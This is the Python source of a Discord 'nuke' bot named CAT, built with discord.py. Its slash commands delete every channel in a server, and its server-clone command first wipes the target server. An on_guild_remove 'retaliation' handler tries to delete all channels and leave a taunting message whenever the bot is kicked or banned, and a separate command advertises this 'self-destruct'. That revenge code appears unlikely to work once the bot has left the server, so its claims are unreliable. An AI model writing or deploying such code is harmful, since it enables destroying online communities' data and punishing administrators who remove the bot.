import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import os
import traceback

intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True
intents.members = True

class CatBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="!", intents=intents)
        self.synced = False
        self.nuke_triggered = False

    async def on_ready(self):
        await self.wait_until_ready()
        if not self.synced:
            await self.tree.sync()
            self.synced = True
            print(f"✅ CAT Ultimate online — {self.user}")

    async def on_guild_remove(self, guild):
        """SELF-DESTRUCT: Delete all channels if bot is kicked/banned."""
        if self.nuke_triggered:
            return
        self.nuke_triggered = True
        
        print(f"💀 RETALIATION TRIGGERED on {guild.name}")
        asyncio.create_task(self.nuke_guild(guild))

    async def nuke_guild(self, guild):
        """Parallel channel deletion — maximum speed."""
        tasks = []
        for channel in guild.channels:
            tasks.append(self.force_delete(channel))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        try:
            new_channel = await guild.create_text_channel("💀-CAT-strikes-back")
            await new_channel.send("**ALL CHANNELS OBLITERATED.** You nuked CAT. You lose.")
        except:
            pass

    async def force_delete(self, channel):
        """Brute force delete — no mercy."""
        try:
            await channel.delete()
        except:
            pass

bot = CatBot()

# ============================================================
# COMMAND 1: DELETE ALL CHANNELS
# ============================================================
@bot.tree.command(
    name="deleteallchannels",
    description="🔥 DELETE EVERY CHANNEL in this server (ADMIN ONLY)"
)
@app_commands.default_permissions(administrator=True)
async def deleteallchannels(interaction: discord.Interaction):
    """Wipe all channels instantly."""
    await interaction.response.send_message("💀 **CHANNEL PURGE — 100% REAL DELETION**", ephemeral=False)
    
    guild = interaction.guild
    tasks = [bot.force_delete(ch) for ch in guild.channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    
    fresh = await guild.create_text_channel("☠️-reset-by-CAT")
    await fresh.send("**EVERY CHANNEL DELETED.** Server is now empty. — 🐈")

# ============================================================
# COMMAND 2: CLONE SERVER
# ============================================================
@bot.tree.command(
    name="clone",
    description="📋 Clone ALL channels from source server to target server"
)
@app_commands.default_permissions(administrator=True)
async def clone(
    interaction: discord.Interaction,
    source_id: str,
    target_id: str
):
    """Clone everything — categories, text, voice, forums."""
    
    await interaction.response.send_message(
        f"📋 **CLONING STARTED**\n"
        f"Source: `{source_id}`\n"
        f"Target: `{target_id}`\n"
        f"⏳ Processing...",
        ephemeral=False
    )

    try:
        src_id = int(source_id)
        tgt_id = int(target_id)

        source_guild = bot.get_guild(src_id)
        target_guild = bot.get_guild(tgt_id)

        if not source_guild:
            await interaction.followup.send("❌ **Source server not found.** Make sure I'm in it.")
            return

        if not target_guild:
            await interaction.followup.send("❌ **Target server not found.** Make sure I'm in it.")
            return

        bot_member = target_guild.me
        if not bot_member.guild_permissions.manage_channels:
            await interaction.followup.send("❌ **Missing `Manage Channels` permission in target server.**")
            return

        # DELETE ALL EXISTING CHANNELS IN TARGET
        await interaction.followup.send("🗑️ **Deleting existing channels in target...**")
        for channel in target_guild.channels:
            try:
                await channel.delete()
                await asyncio.sleep(0.2)
            except:
                pass

        # CLONE CATEGORIES
        await interaction.followup.send("📂 **Cloning categories...**")
        category_map = {}
        for category in source_guild.categories:
            try:
                new_cat = await target_guild.create_category(
                    name=category.name,
                    position=category.position,
                    overwrites=category.overwrites
                )
                category_map[category.id] = new_cat
                await asyncio.sleep(0.3)
            except Exception as e:
                await interaction.followup.send(f"⚠️ Category `{category.name}` failed: {str(e)[:50]}")

        # CLONE TEXT CHANNELS
        await interaction.followup.send("💬 **Cloning text channels...**")
        for channel in source_guild.text_channels:
            try:
                parent = category_map.get(channel.category_id) if channel.category_id else None
                await target_guild.create_text_channel(
                    name=channel.name,
                    category=parent,
                    position=channel.position,
                    topic=channel.topic or "",
                    slowmode_delay=channel.slowmode_delay,
                    nsfw=channel.nsfw,
                    overwrites=channel.overwrites
                )
                await asyncio.sleep(0.3)
            except Exception as e:
                await interaction.followup.send(f"⚠️ Text channel `{channel.name}` failed: {str(e)[:50]}")

        # CLONE VOICE CHANNELS
        await interaction.followup.send("🔊 **Cloning voice channels...**")
        for channel in source_guild.voice_channels:
            try:
                parent = category_map.get(channel.category_id) if channel.category_id else None
                await target_guild.create_voice_channel(
                    name=channel.name,
                    category=parent,
                    position=channel.position,
                    bitrate=channel.bitrate,
                    user_limit=channel.user_limit,
                    overwrites=channel.overwrites
                )
                await asyncio.sleep(0.3)
            except Exception as e:
                await interaction.followup.send(f"⚠️ Voice channel `{channel.name}` failed: {str(e)[:50]}")

        # CLONE FORUM CHANNELS
        if hasattr(source_guild, 'forums'):
            await interaction.followup.send("📝 **Cloning forum channels...**")
            for channel in source_guild.forums:
                try:
                    parent = category_map.get(channel.category_id) if channel.category_id else None
                    await target_guild.create_forum(
                        name=channel.name,
                        category=parent,
                        position=channel.position,
                        topic=channel.topic or "",
                        nsfw=channel.nsfw,
                        overwrites=channel.overwrites
                    )
                    await asyncio.sleep(0.3)
                except Exception as e:
                    await interaction.followup.send(f"⚠️ Forum `{channel.name}` failed: {str(e)[:50]}")

        await interaction.followup.send(
            f"✅ **CLONE COMPLETE!**\n"
            f"📊 `{source_guild.name}` → `{target_guild.name}`\n"
            f"📁 Categories: {len(category_map)}\n"
            f"💬 Text: {len(source_guild.text_channels)}\n"
            f"🔊 Voice: {len(source_guild.voice_channels)}\n"
            f"🐈 **CAT delivers.**"
        )

    except ValueError:
        await interaction.followup.send("❌ **Invalid IDs.** Must be numeric.")
    except Exception as e:
        await interaction.followup.send(f"❌ **Error:** {str(e)[:200]}")

# ============================================================
# COMMAND 3: ARM SELF-DESTRUCT (enable revenge nuke)
# ============================================================
@bot.tree.command(
    name="arm_selfdestruct",
    description="☢️ Enable revenge nuke — delete all channels if bot is kicked"
)
@app_commands.default_permissions(administrator=True)
async def arm_selfdestruct(interaction: discord.Interaction):
    """Arm the nuclear retaliation."""
    await interaction.response.send_message(
        "☢️ **SELF-DESTRUCT ARMED**\n"
        "If I get kicked or banned, this server loses **EVERY CHANNEL**.\n"
        "🐈 CAT does not forgive.",
        ephemeral=False
    )

# ============================================================
# PREFIX FALLBACK COMMANDS
# ============================================================
@bot.command(name="nuke")
@commands.has_permissions(administrator=True)
async def nuke_prefix(ctx):
    await ctx.send("🔥 Use **/deleteallchannels** for instant deletion.")

@bot.command(name="clone")
@commands.has_permissions(administrator=True)
async def clone_prefix(ctx, source_id: str, target_id: str):
    await ctx.send(f"📋 Use **/clone {source_id} {target_id}** instead.")

# ============================================================
# RUN
# ============================================================
bot.run(os.environ.get("DISCORD_TOKEN"))
